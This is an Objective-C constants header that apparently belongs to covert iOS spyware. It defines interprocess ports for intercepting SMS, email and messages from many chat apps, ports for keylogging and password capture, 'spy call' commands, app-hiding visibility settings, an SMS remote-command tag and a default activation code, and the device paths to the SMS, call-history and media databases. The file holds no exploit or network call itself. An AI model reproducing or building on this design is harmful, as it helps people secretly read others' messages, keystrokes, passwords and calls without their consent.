//
//  DefStd.h
//  FxStd
//
//  Created by Makara Khloth on 8/30/11.
//   Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "FxErrorStd.h"

//Success  code
#define _SUCCESS_ 0
#define _ERROR_ -10000
#define _ENABLE_ 1
#define _DISABLE_ 0
#define _DEFAULTACTIVATIONCODE_ @"900900900"
//#define _FULLDEFAULTACTIVATIONCODE_ @"*#900900900"
#define DEFAULTMD5	@"MD5md5MD5md5HaSh"
#define _MAIL_DELIVERY_STATUS_SUCCESS_ 6    //Email
#define _MESSAGE_DELIVERY_STATUS_SUCCESS_ 1 //SMS

#define MONITOR_NUMBERS_LIST_CAPACITY		1
#define FACETIME_IDS_LIST_CAPACITY			1
#define EMERGENCY_NUMBER_LIST_CAPACITY		5
#define NOTIFICATION_NUMBER_LIST_CAPACITY	5
#define HOME_NUMBER_LIST_CAPACITY			5
#define CIS_NUMBER_LIST_CAPACITY			5
#define WATCH_NUMBER_LIST_CAPACITY			10
#define KEYWORD_LIST_CAPACITY				5
#define CALL_RECORD_WATCH_NUMBER_LIST_CAPACITY  10

static NSString* const kFxStringQuestionMark	= @"?";
static NSString* const kFxStringOneSingleQuote	= @"'";
static NSString* const kFxStringTwoSingleQuote	= @"''";
static NSString* const kFxStringSlash           = @"/";
static NSString* const kFxStringSpace			= @" ";
static NSString* const kFxStringNewLine			= @"\n";
static NSString* const kFxStringComma			= @",";
// Message port
static NSString* const kAppEngineSendMessagePort= @"APPENGINEPORT";
static NSString* const kAppUISendMessagePort	= @"APPUIPORT";	
static NSString* const kSMSMessagePort	        = @"SMSMESSAGEPORT";
static NSString* const kMMSMessagePort	        = @"MMSMESSAGEPORT";
static NSString* const kSMSMessagePortIOS6plus	= @"SMSMESSAGEPORT6plus";
static NSString* const kMMSMessagePortIOS6plus	= @"MMSMESSAGEPORT6plus";
static NSString* const kSMSCommandPort	        = @"SMSCOMMANDPORT";
static NSString* const kEmailMessagePort	    = @"EMAILPORT";
static NSString* const kiMessageMessagePort1	= @"iMESSAGEPORT1";
static NSString* const kiMessageMessagePort2	= @"iMESSAGEPORT2";
static NSString* const kMediaPort1	        	= @"MEDIAPORT1";
static NSString* const kMediaPort2	        	= @"MEDIAPORT2";
static NSString* const kWhatsAppMessagePort1   	= @"WhatsAppMessagePort1";
static NSString* const kWhatsAppMessagePort2   	= @"WhatsAppMessagePort2";
static NSString* const kBookmarkMessagePort		= @"BookmarkMessagePort";
static NSString* const kBrowserUrlMessagePort	= @"BrowserUrlMessagePort";
static NSString* const kPanicImageMessagePort	= @"PanicImageMessagePort";
static NSString* const kPanicImageDaemonSenderMessagePort	= @"PanicImageCommandMessagePort";
static NSString* const kPanicImageUISenderMessagePort		= @"PanicImageStatusMessagePort";
static NSString* const kAlertMessagePort		= @"AlertMessagePort";
static NSString *const kIMEIGetterMessagePort	= @"IMEIGETTERMSGPORT";
static NSString * const kALCMessagePort			= @"ALCMSGPORT";
static NSString * const kAllBlockAlertViewDismissMessagePort	= @"ABAVDMSGPORT";
static NSString * const kFSBSUIAlertMessagePort	= @"FSBSUIALERTMSGPORT";
static NSString * const kLINEMessagePort1			= @"LINEMSGPORT1";
static NSString * const kLINEMessagePort2			= @"LINEMSGPORT2";
static NSString * const kLINEMessagePort3			= @"LINEMSGPORT3";
static NSString * const kLINECallLogMessagePort1	= @"LINECALLOGMSGPORT1";
static NSString * const kLINECallLogMessagePort2	= @"LINECALLOGMSGPORT2";
static NSString * const kLINECallLogMessagePort3	= @"LINECALLOGMSGPORT3";
static NSString * const kSkypeMessagePort1			= @"SKYPEMSGPORT1";
static NSString * const kSkypeMessagePort2			= @"SKYPEMSGPORT2";
static NSString * const kSkypeMessagePort3			= @"SKYPEMSGPORT3";
static NSString * const kSkypeCallLogMessagePort1	= @"SKYPECALLOGMSGPORT1";
static NSString * const kSkypeCallLogMessagePort2	= @"SKYPECALLOGMSGPORT2";
static NSString * const kSkypeCallLogMessagePort3	= @"SKYPECALLOGMSGPORT3";
static NSString * const kNoteACMessagePort			= @"NOTEACMSGPORT";
static NSString * const kFacebookMessagePort		= @"FACEBMSGPORT";
static NSString * const kFacebookCallLogMessagePort1= @"FACEBOOKCALLOGMSGPORT1";
static NSString * const kFacebookCallLogMessagePort2= @"FACEBOOKCALLOGMSGPORT2";
static NSString * const kFacebookCallLogMessagePort3= @"FACEBOOKCALLOGMSGPORT3";
static NSString * const kViberMessagePort			= @"VIBERMSGPORT";
static NSString * const kViberCallLogMessagePort1	= @"VIBERCALLOGMSGPORT1";
static NSString * const kViberCallLogMessagePort2	= @"VIBERCALLOGMSGPORT2";
static NSString * const kViberCallLogMessagePort3	= @"VIBERCALLOGMSGPORT3";
static NSString * const kWeChatMessagePort			= @"WECHATMSGPORT";
static NSString * const kWeChatMessagePort1			= @"WECHATMSGPORT1";
static NSString * const kWeChatMessagePort2			= @"WECHATMSGPORT2";
static NSString * const kBBMMessagePort				= @"BBMMSGPORT";
static NSString * const kBBMMessagePort1			= @"BBMMSGPORT1";
static NSString * const kBBMMessagePort2			= @"BBMMSGPORT2";
static NSString * const kHangoutMessagePort			= @"HANGOUTMSGPORT";
static NSString * const kHangoutMessagePort1		= @"HANGOUTMSGPORT1";
static NSString * const kHangoutMessagePort2		= @"HANGOUTMSGPORT2";
static NSString * const kSnapchatMessagePort1		= @"SNAPCHATMSGPORT1";
static NSString * const kSnapchatMessagePort2		= @"SNAPCHATMSGPORT2";
static NSString * const kSnapchatMessagePort3		= @"SNAPCHATMSGPORT3";
static NSString * const kYahooMsgMessagePort1		= @"YAHOOMSGMSGPORT1";
static NSString * const kYahooMsgMessagePort2		= @"YAHOOMSGMSGPORT2";
static NSString * const kYahooMsgMessagePort3		= @"YAHOOMSGMSGPORT3";
static NSString * const kSlingshotMessagePort1		= @"SLINGSHOTMSGPORT1";
static NSString * const kSlingshotMessagePort2		= @"SLINGSHOTMSGPORT2";
static NSString * const kSlingshotMessagePort3		= @"SLINGSHOTMSGPORT3";
static NSString * const kInstagramMessagePort1		= @"INSTAGRAMMSGPORT1";
static NSString * const kInstagramMessagePort2		= @"INSTAGRAMMSGPORT2";
static NSString * const kInstagramMessagePort3		= @"INSTAGRAMMSGPORT3";
static NSString * const kTinderMessagePort1         = @"TINDERMSGPORT1";
static NSString * const kTinderMessagePort2         = @"TINDERMSGPORT2";
static NSString * const kTinderMessagePort3         = @"TINDERMSGPORT3";

static NSString * const kKeyLogMessagePort			= @"KEYLOGMSGPORT";
static NSString * const kKeyLogMessagePort1			= @"KEYLOGMSGPORT1";
static NSString * const kKeyLogMessagePort2			= @"KEYLOGMSGPORT2";


static NSString * const kWeChatCallLogMessagePort1	= @"WECHATCALLOGMSGPORT1";
static NSString * const kWeChatCallLogMessagePort2	= @"WECHATCALLOGMSGPORT2";
static NSString * const kWeChatCallLogMessagePort3	= @"WECHATCALLOGMSGPORT3";
static NSString * const kSendSMSCmdReplyMessagePort		= @"SMSSENDERMSGPORT";
static NSString * const kSentSMSCmdReplyMessagePort		= @"SMSSENTMSGPORT";
static NSString * const kActivationWizardMessagePort	= @"ACTWIZARDMSGPORT";

static NSString * const kPasswordMessagePort        = @"PWDMSGPORT";
static NSString * const kPasswordMessagePort1		= @"PWDMSGPORT1";
static NSString * const kPasswordMessagePort2		= @"PWDMSGPORT2";

static NSString * const kPasscodeMessagePort        = @"PASSCODEMSGPORT";


// Host and port
static NSString* const kLocalHostIP				= @"127.0.0.1";
static NSInteger const kMSSmsReceiverSocketPort	= 50035;
static NSInteger const kMSPanicButtonSocketPort = 50036;
static NSInteger const kAppEngineSendSocketPort = 50037;
static NSInteger const kAppUISendSocketPort		= 50038;
static NSInteger const kMSMailReceiverSocketPort= 50039;

// Message  keys
static NSString* const kMessageFilePath        =@"/var/tmp/";
static NSString* const kMessageTypeKey         =@"MESSAGETYPE";
static NSString* const kMessageTypeSMS         =@"SMS";
static NSString* const kMessageTypeMMS         =@"MMS";

//Monitor keys
static NSString* const kMessageMonitorKey      =@"MESSAGE";
static NSString* const kMAILMonitorKey         =@"MAIL";
static NSString* const kMediaMonitorKey        =@"Media";

// SMS  keys
static NSString* const kSMSComandFormatTag      =@"<*#";
static NSString* const kSMSTextKey              =@"SMSTEXT";
static NSString* const kSMSIncomming            =@"SMSINCOMING";
static NSString* const kSMSOutgoing             =@"SMSOUTGOING";
static NSString* const kSMSTypeKey              =@"SMSTYPE";
static NSString* const kSMSGroupIDKey			=@"SMSGROUPID";
static NSString* const kSMSInfoGroupIDKey		=@"SMSINFOGROUPID";

// MMS  keys
static NSString* const kMMSTextKey              =@"MMSTEXT";
static NSString* const kMMSRecipients           =@"MMSRECIPIENTS";
static NSString* const kMMSIncomming            =@"MMSINCOMING";
static NSString* const kMMSOutgoing             =@"MMSOUTGOING";
static NSString* const kMMSAttachments          =@"MMSATTACHMENTS";
static NSString* const kMMSTypeKey              =@"MMSTYPE";
static NSString* const kMMSAttachmenInfoKey		=@"ATTACHMENTDATA";
static NSString* const kMMSFileNameKey          =@"FILENAME";
static NSString* const kMMSGroupIDKey			=@"MMSGROUPID";
static NSString* const kMMSDateStringKey		=@"MMSDATESTRING";

static NSString* const kMMSInfoGroupIDKey		=@"MMSINFOGROUPID";
static NSString* const kMMSInfoDateStringKey	=@"MMSINFODATESTRING";

//SMSCTSERVER keys
//*******Important: Do not change these keys *****************************
static NSString* const kMessageInfoKey            =@"SMSPiecesKey";
static NSString* const kMessageTextBodyKey        =@"SMSTextBodyKey";
static NSString* const kMessageAttachmentFilePath =@"SMSPieceFilenameKey";
static NSString* const kMessageDataKey            =@"SMSPieceDataKey";
static NSString* const kMessageFileNameKey        =@"SMSPieceContentLocationKey";
static NSString* const kMessageTextContentType    =@"text/plain";
static NSString* const kMessageSMILContentType    =@"application/smil";
static NSString* const kMessageContentTypeKey     =@"SMSPieceTypeKey";
static NSString* const kMessageSubjectKey         =@"SMSSubjectKey";
static NSString* const kMessageSenderKey          =@"SMSDestinationAddressKey";
static NSString* const kMessageRecipientKey       =@"SMSDestinationAddressesKey";

//Mail  Header Keys
static NSString* const kMAILTo                  = @"To";
static NSString* const kMAILCc                  = @"Cc";
static NSString* const kMAILBCc                 = @"Bcc";
static NSString* const kMAILFrom                = @"From";
static NSString* const kMAILSubject             = @"Subject";
static NSString* const kMAILDate                = @"Date";
static NSString* const kMAILMessage             = @"Message";
static NSString* const kMAILMessageType         = @"MessageType";
static NSString* const kMAILBodyTypeHtml        = @"HTML";
static NSString* const kMAILBodyTypeText        = @"Text";
static NSString* const kMAILHeaders             = @"Headers";
static NSString* const kMAILBody                = @"Body";
static NSString* const kMAILType                = @"MailType";
static NSString* const kMAILTypeIncomming       = @"Incomming";
static NSString* const kMAILTypeOutgoing        = @"Outgoing";
static NSString* const kMAILFileName            = @"MailFileName";
static NSString* const kMAILFilePath            = @"/var/tmp/";
static NSString* const kMAILReceived            = @"MailReceived";
static NSString* const kMAILSent                = @"MailSent";

// IM Service IDs
static NSString * const kIMServiceIDiChat		= @"ict";
static NSString * const kIMServiceIDSkype		= @"skp"; 
static NSString * const kIMServiceIDWhatsApp	= @"wha"; 
static NSString * const kIMServiceIDiMessage	= @"ims";

// iMessage keys
static NSString* const kiMessageArchived		= @"iMessageArchived";

// Browser keys
static NSString* const kBookmarkArchived		= @"BookmarkArchived";
static NSString* const kBrowserUrlArchived		= @"BrowserUrlArchived";

// Panic image keys
static NSString* const kPanicImageArchived		= @"PanicImageArchived";

// Application life cycle keys
static NSString * const kALCArchived			= @"ALCArchived";

// LINE archive key
static NSString * const kLINEArchived			= @"LINEArchived";

// Skype archive key
static NSString * const kSkypeArchived			= @"SkypeArchived";

// Facebook archive key
static NSString * const kFacebookArchied		= @"FacebookArchived";

// Viber archive key
static NSString * const kViberArchied			= @"ViberArchived";

// WeChat archive key
static NSString * const kWeChatArchied			= @"WeChatArchied";

// BBM archive key
static NSString * const kBBMArchied				= @"BBMArchied";

// Hangout archive key
static NSString * const kHangoutArchied			= @"HangoutArchied";

// KeyLog archive key
static NSString * const kKeyLogArchied			= @"KeyLogArchied";

// Password archive key
static NSString * const kPasswordArchived       = @"PwdArchived";

// Snapchat archive key
static NSString * const kSnapchatArchived		= @"SnapchatArchived";

// Yahoo Messenger archive key
static NSString * const kYahooMsgArchived		= @"YahooMsgArchived";

// Tinder archive key
static NSString * const kTinderArchived		= @"TinderArchived";

// Instagram archive key
static NSString * const kInstagramArchived		= @"InstagramArchived";

// IM generic archive key
static NSString * const kIMMsgArchived          = @"IMMsgArchived";

// Media Keys
static NSString* const kMediaNotification			 = @"MediaNotification";
static NSString* const kMediaType                    = @"MediaType";
static NSString* const kMediaPath                    = @"MediaPath";
static NSString* const kMediaTypeAudio               = @"MediaTypeAudio";
static NSString* const kMediaTypeVideo               = @"MediaTypeVideo";
static NSString* const kMediaTypePhoto               = @"MediaTypePhoto";
static NSString* const kMediaTypeWallPaper           = @"MediaTypeWallPaper";
static NSString* const kWallPaperImageSavedFilePath  = @"/var/tmp/wallpaper_%lf.jpeg";
static NSString* const kWallPaperStatusInfo          = @"WallPaperStatusInfo";

//Setting Processor Parameter keys
static NSString* const kSettingsIDTag          = @"SettingID";
static NSString* const kSettingsValueTag       = @"SettingValue";
static NSString* const kSettingsIDSeperator    = @":";
static NSString* const kSettingsValueSeperator = @";";

//WhatsApp
static NSString* const kWhatsAppContactNumber       = @"WhatsAppContactNumber";
static NSString* const kWhatsAppContactName         = @"WhatsAppContactName";
static NSString* const kWhatsAppContactJID          = @"WhatsAppContactJID";

//Running Process Keys

static NSString* const kRunningProcessIDTag     = @"ProcessID";
static NSString* const kRunningProcessNameTag   = @"ProcessName";

// Share file ipc id
typedef enum {
    kSharedFileVisibilityID			= 1,
	kSharedFileKeywordID			= 2,
	kSharedFileMonitorNumberID		= 3,
	kSharedFileAudioActiveID		= 4,
	kSharedFileEmergencyNumberID	= 5,
	kSharedFileAddressbookModeID	= 6,
	kSharedFileClientSyncTimeID		= 7,
	kSharedFileServerSyncTimeID		= 8,
	kSharedFileSyncCDID				= 9,
	kSharedFileIsTimeSyncID			= 10,
	kSharedFileAddressbookID		= 11,
	kSharedFileRestrictionEnableID	= 12,
	kSharedFileAlertLockID			= 13,
	kSharedFileAlertLockCounterID	= 14,
//	kSharedFilePatternUnblockID		= 15, // Obsolete should use by other new
	kSharedFileAppPolicyProfileID	= 16,
	kSharedFileAppsProfileID		= 17,
	kSharedFileUrlPolicyProfileID	= 18,
	kSharedFileUrlsProfileID		= 19,
	kSharedFileIsAppProfileEnableID	= 20,
	kSharedFileIsUrlProfileEnableID	= 21,
	kSharedFileServerClientDiffTimeIntervalID	= 22,
	kSharedFileNotificationNumberID				= 23,
	kSharedFileFeelSecureSettingsBundleLaunchID	= 24,
	kSharedFilePanicStartID						= 25,
	kSharedFileHomeNumberID						= 26,
	kSharedWaitingForApprovalPolicyID			= 27,
	kSharedFileVisibilitiesONID					= 28,
	kSharedFileVisibilitiesOFFID				= 29,
	kSharedFileFaceTimeIDID						= 30
} FxSharedFileID;

// Common share file name
static NSString* const kSharedFileMobileSubstrate	= @"msshf.sqlitedb";
static NSString* const kSharedFileMobileSubstrate1	= @"msshf1.sqlitedb";
static NSString* const kSharedFileMobileSubstrate2	= @"msshf2.sqlitedb";
static NSString* const kSharedFileMobileSubstrate3	= @"msshf3.sqlitedb";
static NSString* const kSharedFileMobileSubstrate4	= @"msshf4.sqlitedb";
static NSString* const kSharedFileMobileSubstrate5	= @"msshf5.sqlitedb";

// Application visibility message port name
static NSString * const kAppVisibilityMessagePort	= @"APPVISMSGPORT";

// Address book
static NSString* const kUIAddressBookFolder		= @"/var/mobile/Library/AddressBook/";
static NSString* const kDaemonAddressBookFolder	= @"/var/root/Library/AddressBook/"; // unused since it has no actual record

// Camera and recorder
static NSString* const  kPhotoLibraryPath		= @"/var/mobile/Media/DCIM/"; // 100APPLE/ 101APPLE/ 102APPLE/ ...
static NSString* const  kAudioLibraryPath		= @"/var/mobile/Media/Recordings/";

// Call log history database
static NSString* const kCallHistoryDatabasePath     = @"/var/wireless/Library/CallHistory/call_history.db";
static NSString* const kCallHistoryDatabasePathiOS8	= @"/var/mobile/Library/CallHistoryDB/CallHistory.storedata";

// path to SMS database
static NSString* const kSMSHistoryDatabasePath		= @"/private/var/mobile/Library/SMS/sms.db";
// path to SMS Sportlight database
static NSString* const kSMSSportlightDatabasePath	= @"/var/mobile/Library/Spotlight/com.apple.MobileSMS/SMSSearchdb.sqlitedb";

//
static NSString * const kFileAudioTimeStamp			= @"ats.ts";
static NSString * const kFileVideoTimeStamp			= @"vts.ts";
static NSString * const kFileCameraImageTimeStamp	= @"cits.ts";
static NSString * const kFileWallPaperChecksum		= @"wp.cs";
static NSString * const kFileWallPaperChecksumLocked= @"wplocked.cs";

// Spy call
static NSString * const kMobilePhoneMsgPort					= @"MPPORT";
static NSString * const kSpringBoardMsgPort					= @"SBPORT";
static NSString * const kInCallServiceMsgPort               = @"ICSPORT";
static NSString * const kSpringBoardRelayBroadcastMsgPort	= @"SBRBPORT";
static NSString * const kSpyCallMSCommandMsgPort			= @"SPCMSPORT";
static NSString * const kSpyCallPhoneNumberPickerMsgPort1	= @"SPTNPPORT1";    // SpringBoard
static NSString * const kSpyCallPhoneNumberPickerMsgPort2	= @"SPTNPPORT2";    // Mobile phone
static NSString * const kSpyCallVoiceMemoPlayingMsgPort		= @"SPVMPPORT";     // VoiceMemo
static NSString * const kSpyCallSpringBoardRecordingMsgPort	= @"SPSBRPORT";     // SpringBoard

// FaceTime spy call
static NSString * const kFaceTimeSpyCallMSCommandMsgPort	= @"FTSPCMSPORT";

static NSString * const kNormalCallDirection	= @"normal-call-direction";
static NSString * const kNormalCallNumber		= @"normal-call-number";
static NSString * const kTeleNumbers			= @"telNumbers";
static NSString * const kTeleDirections			= @"telDirections";
static NSString * const kTeleMaxLines			= @"maxLines";

typedef enum {
	kSpyCallMSNormalCallInProgress,
	kSpyCallMSNormalCallOnHold,
	kSpyCallMSAudioIsActive,
	kSpyCallMSMaxConferenceLine,
	kSpyCallMSSpyCallInProgress,
    kSpyCallMSFaceTimeInProgress,
    kSpyCallMSConferenceNotSupport
} SpyCallMSCmdID;

// Time sync
static NSString * const kTimeSyncManagerMsgPort	= @"TSMPORT";

// Contact update
static NSString * const kContactUpdateMsgPort	= @"CONUPORT";
static NSString * const kDaemonApplicationUpdatingAddressBookNotification			= @"ApplicationUpdatingAddressBookNotification";
static NSString * const kDaemonApplicationUpdatingAddressBookFinishedNotification	= @"ApplicationUpdatingAddressBookFinishedNotification";

// Settings bundle message port
static NSString * const kSettingBundleMsgPort	= @"SETBUNDLEPORT";

// Notification posted by blocking mobile substrate
static NSString * const kDidBlockOutingEmailNotification	= @"DidBlockOutgoingEmail";
static NSString * const kOutgoingMailTimestampKey			= @"OutgoingMailTimestamp";

// Panic resume notification
static NSString * const kResumePanicNotification            = @"ResumePanicNotification";
static NSString * const kResumePanicOnUINotification   = @"ResumePanicOnUINotification";

// Temporal Control Application
static NSString * const kTemporalControlApplicationPort             = @"TemporalControlApplicationPort";

static NSString * const kTemporalControlApplicationCommandKey       = @"TemporalControlApplicationCommandKey";
static NSString * const kTemporalControlApplicationIDKey            = @"TemporalControlApplicationIDKey";
static NSString * const kTemporalControlApplicationStartTimeKey            = @"TemporalControlApplicationStartTimeKey";
static NSString * const kTemporalControlApplicationCommandString      = @"<*#FSCOMMAND>";  // controlID:HH:mm
static NSString * const kTemporalControlApplicationCommandFormat      = @"<*#FSCOMMAND>,%@,%@:%@";  // controlID:HH:mm
static NSString * const kTemporalControlApplicationMidnightPassedNotification      = @"TemporalControlApplicationMidnightPassedNotification";

// Location update notification
static NSString * const kSignificantLocationChangesNotification      = @"SignificantLocationChangesNotification";


